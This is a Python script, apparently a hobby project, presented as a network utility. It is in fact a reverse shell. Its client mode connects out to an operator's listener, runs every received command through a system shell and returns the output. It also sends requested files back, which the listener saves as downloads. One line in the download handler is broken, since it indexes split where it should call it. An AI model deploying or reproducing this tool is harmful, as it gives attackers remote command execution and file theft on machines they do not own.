import socket
import argparse
import threading
import subprocess
import os
import sys


class Server:
	def __init__(self,port):
		self.host = "0.0.0.0"
		self.port = port
		
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((self.host,self.port))
		listener.listen(5)
		print(f"Listening on {self.host}:{self.port}")

		self.connection, address = listener.accept()
		print()
		print(f"Received connection from {address}")
		# ct = threading.Thread(target=self.handle, args=())
		# ct.start()
	

	def handle(self):
		while True:
			command = input("netutil2.0 > ")
			command += "\n"

			response = self.rce(command)

			if command.count("download") > 0:
				response = self.download_file(command, response)
				
			print(response)


	def download_file(self, command, content):
		path = command.split[" "][1]
		try:
			with open(path,"wb") as dl_file:
				dl_file.write(content)
			return f"Downloaded {path}"
		except:
			return "Download failed"

	
	def rce(self, command):
		self.connection.send(bytes(command, "utf-8"))

		if command == "exit\n":
			self.connection.close()
			print("Exiting")
			exit()

		response = ""
		while True:
			data = self.connection.recv(4096)
			recv_len = len(data)
			response += data.decode("utf-8")

			if recv_len < 4096:
				break

		return response


class Client:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))


	def exec_command(self, command):
		return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)


	def move_fs(self, command):
		new_dir = command.split(" ")[1]
		os.chdir(new_dir)
		new_dir_name = self.exec_command("pwd")
		return f"Changed directory to {new_dir} ({new_dir_name})"


	def run(self):
		while True:
			command = ""
			while "\n" not in command:
				command += self.connection.recv(1024).decode("utf-8")
			command = command.rstrip()

			if command == "exit":
				self.connection.close()
				exit()
			elif command.count("cd") > 0 and len(command) > 3:
				result = self.move_fs(command)
			elif command.count("download") > 0:
				result = self.read_file(command)
			else:
				result = self.exec_command(command)

			if type(result) is not bytes:
				result = bytes(result, "utf-8")

			self.connection.send(result)


	def read_file(self, command):
		path = command.split(" ")[1]
		with open(path, "rb") as in_file:
			return in_file.read()


def define_args():
	parser = argparse.ArgumentParser(description="All-In-One Network Utility by Aditya Arole (@e1ora)",usage="\nOn host: python3 aionet.py -p PORT -l\nOn remote machine: python3 aionet.py -t TARGET -p PORT")
	parser.add_argument("-t","--target",dest="target",type=str,metavar="target",help="IP address of the remote listener")
	parser.add_argument("-p","--port",dest="port",type=int,metavar="port",help="If used with -l, port where listener is to be created; else, port where remote listener exists")
	parser.add_argument("-l","--listen",dest="listen",action="store_true",help="Create a listener on the port defined using -p")
	parser.set_defaults(listen=False)

	return parser.parse_args(sys.argv[1:])


def main():
	args = define_args()

	if args.listen:
		server = Server(args.port)
		server.handle()
	else:
		client = Client(args.target,args.port)
		client.run()


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		pass